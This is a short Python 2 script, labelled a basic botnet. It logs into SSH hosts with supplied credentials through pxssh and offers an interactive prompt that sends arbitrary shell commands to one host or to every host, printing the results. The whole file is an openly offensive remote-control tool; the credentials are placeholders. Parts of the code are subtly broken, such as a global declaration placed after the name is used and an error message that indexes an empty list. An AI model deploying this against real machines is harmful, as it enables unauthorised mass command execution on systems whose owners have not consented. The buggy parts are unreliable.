#basic botNet

import pxssh

currentBot  = "*"
botNet = []

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except ValueError as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[+] ' + output)


def addClient(host, user, password):
    global botNet
    client = Client(host, user, password)
    botNet.append(client)
    
def botActions(botCommandLS):
    if "-ls" in botCommandLS:
        cnt = 0
        for client in botNet:
            output = client.send_command("uname -v")
            print(str(cnt) + '. [*] Output from ' + client.host)
            print(str(cnt) + '. [+] ' + output)
            cnt += 1
    elif "-cb" in botCommandLS:
        botCommandLS.remove("bot")
        botCommandLS.remove("-cb")
        if len(botCommandLS) > 0:
            if "-*" in botCommandLS:
                currentBot = "*"
            else:
                global currentBot
                currentBot = int(botCommandLS[0][1:])
        else:
            print("Bot not found matching: " + botCommandLS[0][1:])
    else:
        print("Command not found : 12381")

def main():
    global currentBot
    global botNet
    
    addClient('IP', 'USERNAME', 'PASSWORD')

    #botnetCommand("uname -v")
    while 1:
        command = raw_input(str(currentBot) + ": ")
        if len(command.split(": ")) > 1:
            commandLS = command.split(": ")
            if commandLS[0] == "local":
                commands = commandLS[1].split(" ")
                print(command)
                if commands[0] == "help":
                    print("Help!")
                elif commands[0] == "bot":
                    botActions(commands)
                else:
                    print("Command not found : 31213")
            elif int(commandLS[0]) < len(botNet):
                client=botNet[int(commandLS[0])]
                command = commandLS[1]
                output = client.send_command(command)
                print('[*] Output from ' + client.host)
                print('[+] ' + output)
            else:
                print("Command not found : 18319")
        else:
            if currentBot == "*":
                botnetCommand(command)
            else:
                client=botNet[currentBot]
                output = client.send_command(command)
                print('[*] Output from ' + client.host)
                print('[+] ' + output)
        # botnetCommand('ls -la')




main()
